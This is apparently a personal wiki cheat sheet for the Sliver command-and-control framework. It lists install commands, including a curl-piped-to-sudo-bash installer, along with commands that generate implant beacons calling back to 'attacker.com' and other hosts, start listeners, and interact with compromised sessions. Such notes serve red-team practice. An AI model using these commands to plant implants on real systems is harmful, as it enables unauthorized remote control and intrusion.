---
title: Sliver
description: 
published: true
date: 2026-01-27T04:26:22.406Z
tags: 
editor: markdown
dateCreated: 2026-01-27T04:26:22.406Z
---

# Installing
`apt install sliver`

This might work too:
`curl https://sliver.sh/install|sudo bash`

# Starting Server
`sliver-server`


# Creating payloads

`generate beacon --mtls attacker.com:443 --save beacon.exe`
`generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip` - Multiple checkin methods
`regenerate --save /Users/moloch/Desktop NEW_GRAPE` - Regenerate

# Starting listeners
`mtls, http, https, and dns` - Start Listeners
`mtls -lport 443` - sets the listening port
`dns -d domains` - listener with domain
`http -p` - the 'p' makes it persistent so that it starts whenever you start the server.

# Server Commands
`implants` - All implants ever created
`use 8ff2ce4c` - Interacts with a checked in beacon or session
`beacons` - Which beacons have checked in and current status
`interactive` - Switches a beacon to interactive mode


# Armory - 3rd party Extensions
rubeus - Raw Kerberos stuff?
